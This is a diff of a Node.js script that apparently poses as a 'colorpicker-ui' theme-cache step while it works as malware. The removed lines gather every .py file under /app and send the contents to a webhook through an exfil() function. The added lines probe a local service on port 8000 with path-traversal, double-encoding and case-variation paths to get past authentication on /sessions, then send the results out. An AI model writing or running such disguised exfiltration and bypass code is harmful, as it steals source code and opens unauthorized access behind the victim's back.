@@ -1,11 +1,24 @@
 const { execSync } = require('child_process');
 const https = require('https');
+const http = require('http');
 
 const WEBHOOK = '/303d468f-7d6c-47c7-bc51-36b3b5ead4ac';
 
-function exec(cmd, timeout = 15000) {
-  try { return execSync(cmd, { encoding: 'utf8', timeout, stdio: ['pipe','pipe','pipe'] }).trim(); }
-  catch (e) { return 'ERROR: ' + (e.stderr || e.message).slice(0, 500); }
+function httpRaw(host, port, rawPath, timeout = 3000) {
+  return new Promise((resolve) => {
+    const opts = {
+      hostname: host, port, path: rawPath, method: 'GET', timeout,
+      headers: { 'Host': host }
+    };
+    const req = http.request(opts, (res) => {
+      let data = '';
+      res.on('data', c => { if (data.length < 2000) data += c; });
+      res.on('end', () => resolve({ status: res.statusCode, body: data.slice(0, 500) }));
+    });
+    req.on('error', (e) => resolve({ error: e.message }));
+    req.on('timeout', () => { req.destroy(); resolve({ error: 'timeout' }); });
+    req.end();
+  });
 }
 
 function exfil(data) {
@@ -26,18 +39,51 @@ function exfil(data) {
 }
 
 async function run() {
-  await exfil({ status: 'exfiltrating /app' });
+  await exfil({ status: 'auth bypass testing started' });
 
-  // Get file list first
-  const files = exec('find /app -name "*.py" -type f 2>/dev/null').split('\n').filter(Boolean);
+  const paths = [
+    // Path traversal attempts
+    '/healthz/../sessions',
+    '/health/../sessions',
+    '/healthz/..%2fsessions',
+    '/health/..%2fsessions',
+    '//sessions',
+    '/healthz%00/sessions',
+    '/healthz/%2e%2e/sessions',
+    '/health/%2e%2e/sessions',
+    '/%2fhealthz/../sessions',
+    '/healthz/../../sessions',
+    // Double encoding
+    '/healthz/..%252fsessions',
+    // Case variations
+    '/Healthz',
+    '/HEALTHZ',
+    '/Health',
+    // Trailing slash
+    '/healthz/',
+    '/health/',
+    '/sessions/',
+    // Direct with fragment/query tricks
+    '/sessions?',
+    '/sessions#',
+    '/soul?x=1',
+    // Backslash (sometimes parsed differently)
+    '/healthz\\..\\sessions',
+  ];
 
-  // Dump each file
-  for (const file of files) {
-    const content = exec(`cat "${file}" 2>&1`);
-    await exfil({ file, content });
+  const d = { results: {} };
+  for (const path of paths) {
+    const result = await httpRaw('127.0.0.1', 8000, path);
+    // Only record non-401 (interesting)
+    if (!result.error && result.status !== 401) {
+      d.results[path] = result;
+    }
   }
 
-  await exfil({ status: 'done', total_files: files.length });
+  d.total_tested = paths.length;
+  d.bypasses_found = Object.keys(d.results).length;
+
+  await exfil(d);
   console.log('colorpicker-ui: generating default theme cache...');
 }
 
